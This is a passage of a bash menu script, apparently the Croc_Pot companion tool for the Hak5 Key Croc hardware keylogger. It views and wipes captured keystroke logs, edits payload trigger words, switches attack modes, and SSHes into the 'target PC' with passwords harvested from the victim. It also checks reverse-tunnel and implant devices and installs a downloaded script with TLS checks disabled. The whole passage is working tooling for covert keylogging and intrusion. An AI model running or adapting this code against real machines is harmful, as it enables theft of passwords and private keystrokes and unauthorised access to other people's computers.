	echo -ne "\n\n$(ColorYellow 'Keycroc full Keystroke log file at loot/croc_char.log') ${yellow}count:${clear}${green}$(cat /root/udisk/loot/croc_char.log | wc -m)${clear}\n\n"
	cat /root/udisk/loot/croc_char.log
	echo -ne "\n\n$(ColorYellow 'Keycroc edited Keystroke log file at loot/croc_char.log') ${yellow}count:${clear}${green}$(cat /root/udisk/loot/croc_char.log | wc -m)${clear}\n\n"
	cat /root/udisk/loot/croc_char.log | sed 's/\[ENTER]/\n/g' | sed 's/\[[^]]*\]//g' | sed '/^[[:space:]]*$/d' | tr -s ' '
	echo -ne "\n\n$(ColorYellow 'Keycroc loot/croc_raw.log') ${yellow}count:${clear}${green}$(cat /root/udisk/loot/croc_raw.log | wc -m)${clear}\n\n"
	cat /root/udisk/loot/croc_raw.log
	echo -ne "\n\n$(ColorYellow 'Keycroc /root/loot/matches.log') ${yellow}count:${clear}${green}$(cat /root/udisk/loot/matches.log | wc -m)${clear}\n\n"
	cat /root/udisk/loot/matches.log ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; view_key ;;
esac
}
##
#----Clean keycroc keystroke loot/croc_char.log, loot/croc_raw.log, loot/matches.log
##
clean_log() {
	clear
	echo -ne "$(Info_Screen '
-Clean keycroc keystroke loot/croc_char.log, loot/croc_raw.log, loot/matches.log')\n\n"
	read_all CLEAN KEYCROC KEYSTROKE FILES Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	echo > /root/udisk/loot/croc_char.log
	echo > /root/udisk/loot/croc_raw.log
	echo > /root/udisk/loot/matches.log
	echo -ne "\n$(ColorYellow 'Keycroc keystroke log files have been cleaned')\n/loot/croc_char.log\n/loot/croc_raw.log\n/loot/matches.log\n" ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; clean_log ;;
esac
}
##
#----keycroc loot/croc_char.log menu
##
MenuTitle LOOT/CROC CHAR.LOG MENU ; MenuColor 21 1 VIEW LIVE KEYSTROKES ; MenuColor 21 2 MATCH WORD SCAN ; MenuColor 21 3 MATCH WORD LIST SCAN ; MenuColor 21 4 VIEW CROC CHAR.LOG
MenuColor 21 5 CLEAN CHAR.LOG FILES ; MenuColor 21 6 RETURN TO MAIN MENU ; MenuEnd 24
	case $m_a in
	1) keystrokes_V ; key_file ;; 2) word_check ; key_file ;; 3) list_check ; key_file ;; 4) view_key ; key_file ;; 5) clean_log ; key_file ;; 6) main_menu ;;
	[pP]) Panic_button ;; 0) exit 0 ;; [bB]) menu_A ;; *) invalid_entry ; key_file ;;
	esac
}
##
#----Status nmon monitoring system
##
nmon_system() {
	clear
	echo -ne "$(Info_Screen '
-nmon is short for Nigels performance Monitor for Linux
-More details at http://nmon.sourceforge.net/pmwiki.php')\n\n"
	install_package nmon NMON_MONITORING nmon_system croc_status
	read_all START NMON MONITOR Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	nmon ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; nmon_system ;;
esac
}
##
#----Status list all match words in payloads Option to change MATCH word
##
list_match() {
	clear
	echo -ne "$(Info_Screen '
-List all MATCH words in payloads folder
-Option to change MATCH words
-View installed payloads')\n\n"
CHECK_PAYLOADS
echo -ne "\e[48;5;202;30m${LINE}${clear}\n\n"
if [ "$(OS_CHECK)" = WINDOWS ]; then
	grep MATCH* /root/udisk/payloads/*.txt
elif [ "$(OS_CHECK)" = LINUX ]; then
	grep MATCH* --color=auto /root/udisk/payloads/*.txt
fi
read_all CHANGE MATCH WORD FOR PAYLOAD Y/N AND PRESS [ENTER] ; p_l=${r_a}
case $p_l in
[yY] | [yY][eE][sS])
	read_all ENTER THE PAYLOAD NAME TO CHANGE MATCH WORD AND PRESS [ENTER] ; name_change=${r_a}
	if [ -e "/root/udisk/payloads/${name_change}.txt" ]; then
		R_M=$(cat /root/udisk/payloads/${name_change}.txt | grep MATCH | awk {'print $2'})
		echo -ne "$(ColorYellow 'Current Match word is ')${green}${R_M}${clear}\n"
		read_all ENTER NEW MATCH WORD AND PRESS [ENTER] ; m_w=${r_a}
		sed -i "/MATCH$/!{s/$R_M/$m_w/}" /root/udisk/payloads/${name_change}.txt
		grep MATCH* --color=always /root/udisk/payloads/${name_change}.txt
	else
		invalid_entry ; list_match
	fi ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; list_match ;;
esac
}
##
#----Status check local weather
##
check_weather() {
	clear
	echo -ne "$(Info_Screen '
-Check check local weather
-Author: Igor chubin https://github.com/chubin/wttr.in')\n\n"
	curl wttr.in
	sleep 5
	curl v2.wttr.in/
	sleep 5
	curl wttr.in/moon
	sleep 5
	menu_A
}
##
#----Status "top" An Information-Packed Dashboard display useful information about your system
##
top_croc() {
	clear
	echo -ne "$(Info_Screen '
-top An Information-Packed Dashboard
-Press Q to exit top.

The third line displays the following central processing unit (CPU) values:
-us: Amount of time the CPU spends executing processes for people in user space.
-sy: Amount of time spent running system “kernel space” processes.              
-ni: Amount of time spent executing processes with a manually set nice value.
-id: Amount of CPU idle time.
-wa: Amount of time the CPU spends waiting for I/O to complete.
-hi: Amount of time spent servicing hardware interrupts.
-si: Amount of time spent servicing software interrupts.
-st: Amount of time lost due to running virtual machines (“steal time”).        

The column headings in the process list are as follows:
-PID: Process ID.
-PR: Process priority.
-NI: The nice value of the process.
-VIRT: Amount of virtual memory used by the process.
-RES: Amount of resident memory used by the process.
-SHR: Amount of shared memory used by the process.
-S: Status of the process. (See the list below for the values field can take).
-%CPU: The share of CPU time used by the process since the last update.
-%MEM: The share of physical memory used.
-TIME+: Total CPU time used by the task in hundredths of a second.
-COMMAND: The command name or command line (name + options).
The status of the process can be one of the following:
-D: Uninterruptible sleep
-R: Running -S: Sleeping
-T: Traced (stopped)
-Z: Zombie

Scrolling the Display:
-You can press the Up or Down Arrows, Home, End, and Page Up or Down keys
to move up and down and access all the processes.
Changing the Numeric Units:
-We pressed E to set the dashboard memory units to gibibytes and “e”            
to set the process list memory units to mebibytes.

Changing the Summary Contents:
-Press “l” to toggle the load summary line (the first line) on or off.          
-Press “t” to swap the CPU displays show the percentage of usage for each CPU   
-Press “m” to cycle the memory and swap memory lines.                           
-Press “1” to change the display and see individual statistics for each CPU.    

Color and Highlighting:
-Press “z” to add color to the display.                                         
-Press “y” to highlight running tasks in the process list.                      
-Press “x” highlights the column used to sort the process list.                 

Sorting by Columns sort column by pressing the following:
-P: The %CPU column.
-M: The %MEM column.
-N: The PID column.
-T: The TIME+ column.

See the Full Command Line:
-Press “c” toggles the COMMAND column between displaying the process name.      
-Press “V” To see a tree of processes that were launched.                       

See Processes for a Single User:
-Press “u” to see processes for a single user. Be prompted for the name or UID. 

Only See Active Tasks:
-Press “l” to see only active tasks.                                            

Set How Many Processes to Display:
-Press “n” to limit the display to a certain number of lines.                   

Renice a Process:
-Press “r” to change the nice value (priority) for a process.                   

Kill a Process:
-Press “k” to kill a process. Be prompted for the process ID you want to kill.  

Alternative Display Mode:
-Works best in full-screen mode. Press A display four areas in the process list
and then press “a” to move from area to area.                                   

Other Keystrokes:
-W: Save your settings and customizations.
-d: Set a new display refresh rate.
-Space: Force top to refresh its display right now.')\n\n"
	read_all START TOP Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	top && tput civis ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; top_croc ;;
esac
}
##
#----Cheat sheet by chubin https://github.com/chubin/cheat.sh
##
cheat_sheet() {
	echo -ne "$(Info_Screen '
-Access to the best community driven cheat sheets repositories of the world.
-Has a simple curl/browser/editor interface
-Author: chubin https://github.com/chubin/cheat.sh
-INSTALL: curl -k https://cht.sh/:cht.sh | tee /usr/local/bin/cht.sh
-This will edit the original cht.sh to add (curl -k) option
-Note: The package "rlwrap" is a required dependency to run in shell mode.
-Press Q to exit current search
-Type exit to return back to Croc_Pot menu
-Full read me and how to at https://github.com/chubin/cheat.sh')\n\n"
##
#----Install Cheat sheet to /usr/local/bin/cht.sh
##
	install_package rlwrap RLWRAP cheat_sheet
if [ -e /usr/local/bin/cht.sh ]; then
	echo -ne "${green}Cheat sheet is installed at /usr/local/bin/cht.sh${clear}\n\n"
else
	read_all INSTALL CHEAT SHEET Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
		curl -k https://cht.sh/:cht.sh | tee /usr/local/bin/cht.sh
		chmod +x /usr/local/bin/cht.sh
		sed -i 's/curl -s/curl -k -s/g' /usr/local/bin/cht.sh
		sed -i 's/curl "$b_opts"/curl -k "$b_opts"/g' /usr/local/bin/cht.sh ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ; menu_A ;;
	*)
		invalid_entry ; cheat_sheet ;;
	esac
fi
##
#----Start Cheat sheet cht.sh --shell
##
	read_all START CHEAT SHEET Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	cht.sh --shell ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ; menu_A ;;
*)
	invalid_entry ; cheat_sheet ;;
esac
}
##
#----Install/run iptraf-ng network monitoring tool
##
iptraf_ng() {
	clear
	echo -ne "$(Info_Screen '
-Using Iptraf, we can monitor IP traffic passing over
the network. Display the general & detailed network interface 
statistics,incoming & outgoing packets of TCP/UDP service & etc
-Install we be apt install iptraf-ng
-To Start type iptraf-ng')\n\n"
	install_package iptraf-ng IPTRAF_NG iptraf_ng menu_A
	read_all START IPTRAF-NG Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	iptraf-ng ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ; menu_A ;;
*)
	invalid_entry ; iptraf_ng ;;
esac
}
##
#----Status Menu
##
menu_A() {
MenuTitle KEYCROC STATUS MENU ; MenuColor 27 1 MEMORY USAGE ; MenuColor 27 2 CPU LOAD ; MenuColor 27 3 NETWORK-CONNECTIONS ; MenuColor 27 4 KERNEL VERSION ; MenuColor 27 5 RUNNING PROCESSES
MenuColor 27 6 CHECK ALL ; MenuColor 27 7 TARGET PC INFO ; MenuColor 27 8 VIEW/LIVE KEYSTROKES ; MenuColor 27 9 START NMON MONITORING ; MenuColor 26 10 LIST MATCH PAYLOADS WORDS
MenuColor 26 11 CHECK LOCAL WEATHER ; MenuColor 26 12 START TOP INFORMATION ; MenuColor 26 13 CHEAT SHEET BASH/PYTHON/JS ; MenuColor 26 14 INSTALL/START IPTRAF-NG ; MenuColor 26 15 RETURN TO MAIN MENU ; MenuEnd 30
	case $m_a in
	1) memory_check ; menu_A ;; 2) cpu_check ; menu_A ;; 3) tcp_check ; menu_A ;; 4) kernel_check ; menu_A ;; 5) processes_check ; menu_A ;; 6) all_checks ; menu_A ;;
	7) pc_info ; menu_A ;; 8) key_file ; menu_A ;; 9) nmon_system ; menu_A ;; 10) list_match ; menu_A ;; 11) check_weather ;; 12) top_croc ; menu_A ;; 13) cheat_sheet ; menu_A ;;
	14) iptraf_ng ; menu_A ;; 15) main_menu ;; [pP]) Panic_button ;; 0) exit 0 ;; [bB]) main_menu ;; *) invalid_entry ; menu_A ;;
	esac
}
menu_A
}
##
#----Edit Files menu/Function
##
function croc_edit_menu() {
	clear
	echo -ne "$(Info_Screen '
-Edit keycroc files with nano or vim
-Select ATTACKMODE MODE')\n"
cd / ; for i in `ls -d */ | wc -l` ; do echo -ne "${yellow}Directory count: ${clear}${green}${i}${clear}\n"; done
cd / ; for i in `ls -d ` ; do g=`find ./$i -type f -print | wc -l`; echo -ne "${yellow}File count: ${clear}${green}${g}${clear}\n"; done 2> /dev/null
##
#----Select editor to use in terminal
##
echo -ne "\e[38;5;19;1;48;5;245m SELECT AN EDITOR [N]-NANO [V]-VIM ${clear}" ; read -r -n1 r_a
case $r_a in
[nN])
	echo -ne "\r${yellow}Editor: ${clear}${green}Nano ${clear}${yellow}Version: ${clear}${green}$(nano --version | head -1 | sed -e 's|^[^0-9]*||' -e 's| .*||')${clear}\033[0K\r\n" ; EDITOR=nano ;;
[vV])
	echo -ne "\r${yellow}Editor: ${clear}${green}Vim ${clear}${yellow}Version: ${clear}${green}$(vim --version | head -1 | sed -e 's|^[^0-9]*||' -e 's| .*||')${clear}\033[0K\r\n" ; EDITOR=vim ;;
*)
	echo -ne "`printf "\e[1A"`\r${yellow}Editor: ${clear}${green}Nano ${clear}${yellow}Version: ${clear}${green}$(nano --version | head -1 | sed -e 's|^[^0-9]*||' -e 's| .*||')${clear}\033[0K\r\n" ; EDITOR=nano ;;
esac
##
#----Edit all files Function
##
edit_all() {
	f=`find ${1} -type f -name "*"` ; echo -ne "${green}${f}${clear}\n"
	echo ""
	read_all ENTER THE FILE NAME TO EDIT AND PRESS [ENTER]
if [ -f "${r_a}" ]; then
	${EDITOR} ${r_a}
else
	invalid_entry ; croc_edit_menu
fi
}
##
#----Edit Config files Function
##
edit_config() {
if [ -e "/root/udisk/config.txt" ]; then
	${EDITOR} /root/udisk/config.txt
else
	invalid_entry ; croc_edit_menu
fi
}
##
#----Edit remove file Function
##
remove_file() {
	cd / ; for i in `ls -d */` ; do g=`find ./$i -type f -print | wc -l` ; echo -ne "${yellow}Directory: ${clear}${cyan}${i} ${clear}${yellow}Contains: ${clear}${green}${g} ${clear}${yellow}files.${clear}\n"; done 2> /dev/null
	read_all ENTER THE DIRECTORY NAME TO VEIW FILES AND PRESS [ENTER] ; local f_n=${r_a}
	f=`find /${f_n} -type f -name "*"` ; echo -ne "${red}${f}${clear}\n"
	read_all ENTER THE FILE NAME TO BE REMOVE AND PRESS [ENTER] ; local r_f=${r_a}
if [ -f "${r_f}" ]; then
	echo -ne ${LINE_}"\e[5m$(ColorRed 'This file will be removed') ${r_f}"${LINE_} ; echo -ne "\n"
	read_all REMOVE FILE Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
		LED R
		echo -ne ${LINE_}"\e[5m$(ColorRed 'Removing this file') ${r_f}"${LINE_}
		rm -f ${r_f} ;;
	[nN] | [nN][oO])
		LED B
		echo -ne "\n$(ColorYellow 'Did not make any changes')\n" ;;
	*)
		invalid_entry ; remove_file ;;
	esac
else
	invalid_entry ; croc_edit_menu
fi
}
##
#----Edit any file on keycroc Function
##
user_edit() {
	cd / ; for i in `ls -d */` ; do g=`find ./$i -type f -print | wc -l` ; echo -ne "${yellow}Directory: ${clear}${cyan}${i} ${clear}${yellow}Contains: ${clear}${green}${g} ${clear}${yellow}files.${clear}\n"; done 2> /dev/null
	read_all ENTER THE DIRECTORY NAME TO VEIW FILES AND PRESS [ENTER] ; local r_f=${r_a}
	f=`find /${r_f} -type f -name "*"` ; echo -ne "${green}${f}${clear}\n"
	read_all ENTER THE FILE NAME TO EDIT AND PRESS [ENTER]
if [ -f "${r_a}" ]; then
	${EDITOR} ${r_a}
else
	invalid_entry ; croc_edit_menu
fi
}
##
#----midnight commander, visual file manager
##
midnight_manager() {
	clear
	echo -ne "$(Info_Screen '
-GNU Midnight Commander is a visual file manager
-More details at https://midnight-commander.org')\n"
##
#----midnight install function
##
mc_install() {
	install_package mc MIDNIGHT_COMMANDER mc_install croc_edit_menu
}
##
#----midnight remove function
##
mc_remove() {
	read_all REMOVE MIDNIGHT COMMANDER Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	apt-get remove mc
	apt-get autoremove
	echo -ne "\n$(ColorGreen 'MIDNIGHT COMMANDER IS NOW REMOVED')\n" ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'KEEPING MIDNIGHT COMMANDER')\n" ;;
*)
	invalid_entry ; mc_remove ;;
esac
}
##
#----midnight Menu
##
MenuTitle MIDNIGHT COMMANDER MENU ; MenuColor 26 1 INSTALL MIDNIGHT COMMANDER ; MenuColor 26 2 REMOVE MIDNIGHT COMMANDER ; MenuColor 26 3 START MIDNIGHT COMMANDER ; MenuColor 26 4 RETURN TO MAIN MENU ; MenuEnd 29
	case $m_a in
	1) mc_install ; midnight_manager ;; 2) mc_remove ; midnight_manager ;; 3) mc ; midnight_manager ;; 4) main_menu ;; [pP]) Panic_button ;; 0) exit 0 ;; [bB]) croc_edit_menu ;; *) invalid_entry ; midnight_manager ;;
	esac
}
##
#----Croc_Pot Edit Menu
##
MenuTitle CROC EDIT MENU
echo -ne "\t\t" ; MenuColor 22 1 CROC PAYLOADS FOLDER | tr -d '\t\n' ; MenuColor 22 8 ATTACKMODE HID | tr -d '\t'
echo -ne "\t\t" ; MenuColor 22 2 CROC TOOLS FOLDER | tr -d '\t\n' ; MenuColor 22 9 RELOAD_PAYLOADS | tr -d '\t'
echo -ne "\t\t" ; MenuColor 22 3 CROC LOOT FOLDER | tr -d '\t\n' ; MenuColor 21 10 ATTACKMODE OFF | tr -d '\t'
echo -ne "\t\t" ; MenuColor 22 4 CROC CONFIG FILE | tr -d '\t\n' ; MenuColor 21 11 ARMING_MODE | tr -d '\t'
echo -ne "\t\t" ; MenuColor 22 5 CROC ENTER FILE NAME | tr -d '\t\n' ; MenuColor 21 12 ATTACKMODE RO_STORGE | tr -d '\t'
echo -ne "\t\t" ; MenuColor 22 6 CROC REMOVE FILES | tr -d '\t\n' ; MenuColor 21 13 ATTACKMODE ETHERNET | tr -d '\t'
echo -ne "\t\t" ; MenuColor 22 7 ATTACKMODE STORAGE | tr -d '\t\n' ; MenuColor 21 14 MIDNIGHT MANAGER | tr -d '\t'
MenuColor 21 15 RETURN TO MAIN MENU
MenuEnd 25
	case $m_a in
	1) edit_all /root/udisk/payloads ; croc_edit_menu ;; 2) edit_all /root/udisk/tools ; croc_edit_menu ;; 3) edit_all /root/udisk/loot ; croc_edit_menu ;; 4) edit_config ; croc_edit_menu ;; 5) user_edit ; croc_edit_menu ;; 6) remove_file ; croc_edit_menu ;;
	7) ATTACKMODE HID STORAGE ; croc_edit_menu ;; 8) ATTACKMODE HID ; croc_edit_menu ;; 9) RELOAD_PAYLOADS ; croc_edit_menu ;; 10) ATTACKMODE OFF ; croc_edit_menu ;; 11) ARMING_MODE ; croc_edit_menu ;; 12) ATTACKMODE RO_STORGE ; croc_edit_menu ;;
	13) ATTACKMODE AUTO_ETHERNET ; croc_edit_menu ;; 14) midnight_manager ; croc_edit_menu ;; 15) main_menu ;; [pP]) Panic_button ;; 0) exit 0 ;; [bB]) main_menu ;; *) invalid_entry ; croc_edit_menu ;;
	esac
}
##
#----Croc_Pot SSH menu/function
##
function ssh_menu() {
	clear
##
#----SSH Install sshpass/check active SSH connection
##
	install_package sshpass SSHPASS ssh_menu
	echo -ne "${yellow}Active SSH connection:${clear}\n${green}$(ss | grep -i ssh)${clear}\n${green}$(last -a | grep -i still)${clear}\n"
#
#----Check and start ssh to hak5 device
#
ip_check_ssh() {
unset -f ping_alert && killall tcpdump 2> /dev/null
ping -q -c 1 -w 1 ${1} &>/dev/null 2>&1
if [[ $? -ne 0 ]]; then
	unset -f ping_alert && killall tcpdump 2> /dev/null
	ping -q -c 1 -w 1 ${2} &>/dev/null 2>&1
	if [[ $? -ne 0 ]]; then
		echo -ne "\e[5m$(ColorRed 'Can not start SSH connect on:')${2}${clear}"
	elif [[ "${#args[@]}" -eq 0 ]]; then
		ssh -o "StrictHostKeyChecking no" root@${2}
	fi
elif [[ "${#args[@]}" -eq 0 ]]; then
	ssh -o "StrictHostKeyChecking no" root@${1}
else
	echo -ne "\e[5m$(ColorRed 'Can not start SSH connect on:')${1}${clear}"
fi
}
##
#----SSH check devices for connection
##
check_device() {
unset -f ping_alert && killall tcpdump 2> /dev/null
ping -q -c 1 -w 1 ${1} &>/dev/null 2>&1
if [[ $? -ne 0 ]]; then
	unset -f ping_alert && killall tcpdump 2> /dev/null
	ping -q -c 1 -w 1 ${DEFAULT_IP} &>/dev/null 2>&1
	if [[ $? -ne 0 ]]; then
		:
	elif [[ "${#args[@]}" -eq 0 ]]; then
		echo -ne "\e[38;5;19;4;1;48;5;245m${@:2}${clear}${yellow}:${clear}${green}ONLINE${clear}${yellow} IP:${clear}${green}$(ping -q -c 1 -w 1 ${DEFAULT_IP} | sed -nE 's/^PING[^(]+\(([^)]+)\).*/\1/p')${clear}" ; get_mac ${1} ; port_check ${1}
	fi
elif [[ "${#args[@]}" -eq 0 ]]; then
	echo -ne "\e[38;5;19;4;1;48;5;245m${@:2}${clear}${yellow}:${clear}${green}ONLINE${clear}${yellow} IP:${clear}${green}$(ping -q -c 1 -w 1 ${1} | sed -nE 's/^PING[^(]+\(([^)]+)\).*/\1/p')${clear}" ; get_mac ${1} ; port_check ${1}
fi 2> /dev/null
}
##
#----SSH check default ip
##
default_ip() {
	unset DEFAULT_IP
	DEFAULT_IP=${1}
}
##
#----SSH shark jack get ip from Croc_Pot_Payload
##
shark_check() {
	local SHARK_IP=/root/udisk/tools/Croc_Pot/shark_ip.txt
if [ -e ${SHARK_IP} ]; then
	if [[ "$(sed -n '1p' ${SHARK_IP})" =~ ${validate_ip} ]]; then
		default_ip $(sed -n '1p' ${SHARK_IP})
	else
		default_ip 172.16.24.1
	fi
fi 2> /dev/null
}
##
#----SSH LAN TURTLE get ip from Croc_Pot_Payload
##
turtle_check() {
	local TURTLE_IP=/root/udisk/tools/Croc_Pot/turtle_mac.txt
if [ -e ${TURTLE_IP} ]; then
	if [[ "$(sed -n '1p' ${TURTLE_IP})" =~ ${validate_ip} ]]; then
		default_ip $(sed -n '1p' ${TURTLE_IP})
	else
		default_ip 172.16.84.1
	fi
fi 2> /dev/null
}
##
#----SSH check port 22 open or closed
##
port_check() {
nc -z -v -w 1 ${1} 22 &>/dev/null 2>&1
if [[ $? -ne 0 ]]; then
	nc -z -v -w 1 ${DEFAULT_IP} 22 &>/dev/null 2>&1
	if [[ $? -ne 0 ]]; then
		echo -ne "${yellow} PORT:${clear}${red}22 CLOSED${clear}\n"
		unset DEFAULT_IP
	elif [[ "${#args[@]}" -eq 0 ]]; then
		echo -ne "${yellow} PORT:${clear}${green}22 OPEN${clear}\n"
		unset DEFAULT_IP
	fi
elif [[ "${#args[@]}" -eq 0 ]]; then
	echo -ne "${yellow} PORT:${clear}${green}22 OPEN${clear}\n"
fi 2> /dev/null
}
##
#----SSH get mac addresses
##
get_mac() {
arp -n ${1} &>/dev/null 2>&1
if [[ $? -ne 0 ]]; then
	if [[ "${save_mac}" =~ ^([[:xdigit:]][[:xdigit:]]:){5}[[:xdigit:]][[:xdigit:]]$ ]]; then
		echo -ne "${yellow} MAC:${clear}${green}${save_mac}${clear}"
		unset save_mac
	else
		:
	fi
elif [[ "${#args[@]}" -eq 0 ]]; then
	echo -ne "${yellow} MAC:${clear}${green}$(arp ${1} | awk '{print $3}' | sed -e 's/HWaddress//g' | sed '/^[[:space:]]*$/d')"
fi 2> /dev/null
}
##
#----SSH check for saved mac address
##
saved_mac() {
if [ -e "${1}" ]; then
	save_mac=$(sed -n ${2} ${1})
fi 2> /dev/null
}
##
#----SSH check for saved mac address for windows
##
saved_mac_win() {
if [ -e "${1}" ]; then
	save_mac=$(cat /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt | grep -iPo \^\.*[[:xdigit:]][[:xdigit:]]:[[:xdigit:]]\.\*\$ | sed -n '/[[:xdigit:]]::/!p' | sed -n '/[[:xdigit:]][[:xdigit:]][[:xdigit:]]:/!p' | cut -d " " -f1 | awk 'FNR <= 1' | sed -e 's/\(.*\)/\L\1/')
fi
}
##
#----SSH check for saved bash bunny mac address
##
bunny_mac() {
if [ "$(OS_CHECK)" = WINDOWS ]; then
	sed -i 's/-/:/g' /root/udisk/tools/Croc_Pot/bunny_mac.txt
	local bunny_v=$(sed -n 1p /root/udisk/tools/Croc_Pot/bunny_mac.txt)
elif [ "$(OS_CHECK)" = LINUX ]; then
	local bunny_v=$(sed -n 1p /root/udisk/tools/Croc_Pot/bunny_mac.txt)
fi 2> /dev/null
if [[ "$(sed -n 1p /root/udisk/tools/Croc_Pot/bunny_mac.txt)" =~ ^([[:xdigit:]][[:xdigit:]]:){5}[[:xdigit:]][[:xdigit:]]$ ]]; then
	local bunny_s=$(sed -n 30p /root/udisk/tools/Croc_Pot/Bunny_Payload_Shell/payload.txt | sed -e 's/ssh -fN -R \(.*\):localhost:22/\1/' | awk '{print $5}')
	echo -ne "\e[38;5;19;4;1;48;5;245mBASH BUNNY${clear}${yellow}:${clear}${green}TUNNEL${clear} ${yellow}IP:${clear}${green}172.16.64.1${clear}${yellow} MAC:${clear}${green}${bunny_v}${clear}${yellow} Port:${clear}${green}${bunny_s}${clear}\n"
else
	:
fi 2> /dev/null
}
##
#----SSH check for save VPS server
##
if [ -e "/root/udisk/tools/Croc_Pot/saved_shell.txt" ]; then
	remote_vps=$(sed -n 1p /root/udisk/tools/Croc_Pot/saved_shell.txt)
fi 2> /dev/null
##
#----SSH check current SSID
##
ssid_check() {
	local ss_id=$(iw dev wlan0 scan | egrep "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sed -n '/'$(sed -n -e 's/^WIFI_SSID //p' /root/udisk/config.txt)'/p')
	local gateway=$(route -n | grep "UG" | grep -v "UGH" | cut -f 10 -d " ")
	local mask=$(/sbin/ifconfig wlan0 | awk '/Mask:/{ print $4;}' | sed 's/Mask:/'\\${yellow}NETMASK:\\${clear}\\${green}'/g')
	echo -ne "\e[38;5;19;4;1;48;5;245mSSID     ${clear}${yellow}:${clear}${green}${ss_id^^}${clear}${yellow} GATEWAY IP:${clear}${green}${gateway} ${clear}${mask}${clear}\n"
}
##
#----SSH check if screen crab connected to network
##
screen_crab() {
	local t_ip=$(route -n | grep "UG" | grep -v "UGH" | cut -f 10 -d " " | sed -r 's/.{1}$//')
	for crab in {1..254} ;do (ping -q -c 1 -w 1 $t_ip$crab >/dev/null &) ;done
	local crab_host=$(arp -a | sed -n 's/\(android-[0-9]*\+.\+lan\)/\1/p' | awk '{print $1}')
	local crab_ip=$(arp -a | sed -n 's/\(android-[0-9]*\+.\+lan\)/\1/p' | awk '{print $2}' | sed 's/[(),]//g')
	if [[ "${crab_ip}" =~ ${validate_ip} ]]; then
		check_device ${crab_ip} SCREEN CRAB
	fi
}
##
#----SSH check signal owl connected to network
##
owl_check() {
#----place Owl mac here
	local OWL_MAC=00:00:00:00:00:00
	local OWL_IP=$(arp -a | sed -ne '/'${OWL_MAC}'/p' | sed -e 's/.*(\(.*\)).*/\1/')
if [[ "${OWL_IP}" =~ ${validate_ip} ]]; then
	IP_O=${OWL_IP}
else
	IP_O=172.16.56.1
fi
}
##
#----SSH display info screen
##
	echo -ne "$(Info_Screen '
-SSH into HAK5 gear & TARGET PC
-Reverse ssh tunnel, Create SSH Public/Private Key
-Ensure devices are connected to the same local network As keycroc')\n"
user_agent_random
local croc_mac=$(cat /sys/class/net/$(ip route show default | awk '/default/ {print $5}')/address)
local croc_city=$(curl -Lsf -A "$userAgent" --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=city)
local croc_country=$(curl -Lsf -A "$userAgent" --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=country)
local croc_region=$(curl -Lsf -A "$userAgent" --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=region)
local croc_isp=$(curl -Lsf -A "$userAgent" --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=isp | awk '{print $1}')
check_device $(os_ip) TARGET PC
echo -ne "\e[38;5;19;4;1;48;5;245mPUBLIC IP${clear}${yellow}:${clear}${green}$(curl -s -A "$userAgent" --connect-timeout 2 --max-time 2 https://checkip.amazonaws.com) ${clear}${yellow}COUNTRY:${clear}${green}${croc_country^^} ${clear}${yellow}CITY:${clear}${green}${croc_city^^}${clear}${yellow}/${clear}${green}${croc_region} ${clear}${yellow}ISP:${clear}${green}${croc_isp^^}${clear}\n"
ssid_check ; check_device croc KEY CROC_ | sed 's/--/'$croc_mac'/g'
default_ip 172.16.42.1 ; check_device mk7 WIFI PINEAPPLE7 
saved_mac /root/udisk/tools/Croc_Pot/squirrel_mac.txt 1p ; default_ip 172.16.32.1 ; check_device squirrel PACKET SQUIRREL
sed -i 's/--//g' /root/udisk/tools/Croc_Pot/turtle_mac.txt 2> /dev/null ; saved_mac /root/udisk/tools/Croc_Pot/turtle_mac.txt 2p ; turtle_check ; check_device turtle LAN TURTLE
saved_mac /root/udisk/tools/Croc_Pot/shark_ip.txt 2p ; shark_check ; check_device shark SHARK JACK
#screen_crab ; owl_check ; check_device ${IP_O} SIGNAL OWL_ ; check_device Pineapple.lan WIFI PINEAPPLET
bunny_mac ; check_device ${remote_vps} REMOTE VPS | sed 's/MAC://g' | sed 's/--//g'
echo -ne "\e[48;5;202;30m${LINE}${clear}\n"
##
#----SSH keycroc to target pc
##
pc_ssh() {
	clear
	echo -ne "$(ColorYellow 'Found save Passwd try this:') $(target_pw)\n"
if [ -e "/root/udisk/tools/Croc_Pot/Croc_OS_Target.txt" ]; then
start_ssh() {
	echo -ne "\t$(ColorYellow 'Target PC user name:') $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)
\t$(ColorYellow 'Target PC IP:') $(os_ip)
\t$(ColorGreen 'Starting SSH with Target PC')\n"
	if [ -e "/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered" ]; then
